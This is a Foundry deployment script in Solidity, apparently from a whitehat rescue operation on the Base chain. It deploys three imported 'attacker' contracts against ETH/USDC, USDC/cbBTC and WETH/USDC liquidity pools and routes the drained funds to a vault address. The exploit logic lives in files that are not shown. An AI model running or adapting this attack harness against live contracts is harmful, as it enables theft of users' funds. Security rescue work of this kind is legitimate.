// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

import "forge-std/Script.sol";
import {ETH_USDC5bpsBaseAttacker_Deployer, ETH_USDC5bpsBaseAttacker} from "./attacker-contracts/Deployable_ETH_USDC_5bpsBase.sol";
import {USDC_cbBTC30bpsBaseAttacker_Deployer, USDC_cbBTC30bpsBaseAttacker} from "./attacker-contracts/Deployable_USDC_cbBTC_30bpsBase.sol";
import {WETH_USDC5bpsBaseAttacker_Deployer, WETH_USDC5bpsBaseAttacker} from "./attacker-contracts/Deployable_WETH_USDC_5bpsBase.sol";

contract ExecuteBaseWhitehat is Script {
    function run() public {
        uint256 DEPLOYER_PRIVATE_KEY = vm.envUint("DEPLOYER_PRIVATE_KEY");

        vm.startBroadcast(DEPLOYER_PRIVATE_KEY);

        // vault.panoptic.eth on base
        address withdrawer = 0x82BF455e9ebd6a541EF10b683dE1edCaf05cE7A1;

        console.log("Executing the first attack, on ETH/USDC5bps:");
        ETH_USDC5bpsBaseAttacker_Deployer ethUsdcAttackerDeployer = new ETH_USDC5bpsBaseAttacker_Deployer{salt: bytes32(uint256(0x123))}(withdrawer);
        console.log("ETH_USDC5bpsBaseAttacker_Deployer deployed at:", address(ethUsdcAttackerDeployer));
        console.log("ETH_USDC5bpsBaseAttacker_Deployer succeeded");
        ETH_USDC5bpsBaseAttacker ethUsdcAttacker = ethUsdcAttackerDeployer.attacker();
        console.log("ETH_USDC5bpsBaseAttacker deployed and holding funds at:", address(ethUsdcAttacker));

        console.log("Executing the second attack, on USDC/cbBTC:");
        USDC_cbBTC30bpsBaseAttacker_Deployer usdcCbBtcAttackerDeployer = new USDC_cbBTC30bpsBaseAttacker_Deployer{salt: bytes32(uint256(0x123))}(withdrawer);
        console.log("USDC_cbBTC30bpsBaseAttacker_Deployer deployed at:", address(usdcCbBtcAttackerDeployer));
        console.log("USDC_cbBTC30bpsBaseAttacker_Deployer succeeded");
        USDC_cbBTC30bpsBaseAttacker usdcCbBtcAttacker = usdcCbBtcAttackerDeployer.attacker();
        console.log("USDC_cbBTC30bpsBaseAttacker deployed and holding funds at:", address(usdcCbBtcAttacker));

        console.log("Executing the third attack, on WETH/USDC:");
        WETH_USDC5bpsBaseAttacker_Deployer wethUsdcAttackerDeployer = new WETH_USDC5bpsBaseAttacker_Deployer{salt: bytes32(uint256(0x123))}(withdrawer);
        console.log("WETH_USDC5bpsBaseAttacker_Deployer deployed at:", address(wethUsdcAttackerDeployer));
        console.log("WETH_USDC5bpsBaseAttacker_Deployer succeeded");
        WETH_USDC5bpsBaseAttacker wethUsdcAttacker = wethUsdcAttackerDeployer.attacker();
        console.log("WETH_USDC5bpsBaseAttacker deployed and holding funds at:", address(wethUsdcAttacker));

        vm.stopBroadcast();
    }
}
